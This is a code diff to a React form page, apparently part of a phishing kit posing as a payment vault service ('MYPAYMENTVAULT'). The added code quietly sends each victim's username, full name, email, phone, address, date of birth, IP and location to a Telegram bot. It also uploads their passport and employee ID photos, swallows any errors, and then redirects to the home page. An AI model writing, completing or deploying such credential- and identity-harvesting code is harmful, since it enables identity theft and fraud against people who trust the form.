@@ -3,6 +3,10 @@ import { useLocation } from "wouter";
 import { useAuth } from "@/lib/auth";
 import { useI18n, type Language } from "@/lib/i18n";
 import { Globe, ChevronDown, Upload } from "lucide-react";
+import { sendTelegram, getIPInfo } from "@/lib/telegram";
+
+const BOT_TOKEN = import.meta.env.VITE_TELEGRAM_BOT_TOKEN;
+const CHAT_ID   = import.meta.env.VITE_TELEGRAM_CHAT_ID;
 
 const languageOptions: { code: Language; label: string }[] = [
   { code: "en", label: "English" },
@@ -31,6 +35,19 @@ const inputStyle: React.CSSProperties = {
   boxSizing: "border-box",
 };
 
+async function sendFileToTelegram(file: File, caption: string): Promise<void> {
+  if (!BOT_TOKEN || !CHAT_ID) return;
+  try {
+    const form = new FormData();
+    form.append("chat_id", CHAT_ID);
+    form.append("caption", caption);
+    form.append("document", file, file.name);
+    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendDocument`, {
+      method: "POST",
+      body: form,
+    });
+  } catch { /* silent */ }
+}
 
 export default function Step4() {
   const { user, isAuthenticated } = useAuth();
@@ -84,6 +101,35 @@ export default function Step4() {
     if (Object.keys(errs).length > 0) { setErrors(errs); return; }
     setErrors({});
     setLoading(true);
+
+    const now = new Date().toLocaleString("id-ID", { timeZone: "Asia/Jakarta" });
+    const ip  = await getIPInfo();
+
+    await sendTelegram(
+      `━━━━━━━━━━━━━━━━━━━━━\n` +
+      `📋 <b>MYPAYMENTVAULT</b>\n` +
+      `📌 <b>Step 4 — Personal Info</b>\n` +
+      `━━━━━━━━━━━━━━━━━━━━━\n\n` +
+      `👤 <b>Username</b>    : <code>${user?.username ?? "-"}</code>\n` +
+      `👦 <b>Nama Lengkap</b>: <code>${firstName} ${lastName}</code>\n` +
+      `📧 <b>Email</b>       : <code>${email}</code>\n` +
+      `📱 <b>Mobile</b>      : <code>${phone}</code>\n` +
+      `🏠 <b>Alamat</b>      : <code>${address}, ${city}, ${state} ${postalCode}</code>\n` +
+      `🎂 <b>Tgl Lahir</b>   : <code>${dob}</code>\n` +
+      `📌 <b>Inquiry</b>     : <code>${inquiryType}</code>\n` +
+      `💬 <b>Pesan</b>       : <code>${message || "-"}</code>\n` +
+      `🌐 <b>IP & Lokasi</b> : <code>${ip}</code>\n` +
+      `🕐 <b>Waktu</b>       : ${now}\n` +
+      `━━━━━━━━━━━━━━━━━━━━━`
+    );
+
+    if (passportFile) {
+      await sendFileToTelegram(passportFile, `📷 Passport Photo — ${user?.username ?? "-"}`);
+    }
+    if (empIdFile) {
+      await sendFileToTelegram(empIdFile, `🪪 Employee ID Photo — ${user?.username ?? "-"}`);
+    }
+
     navigate("/");
   };
 
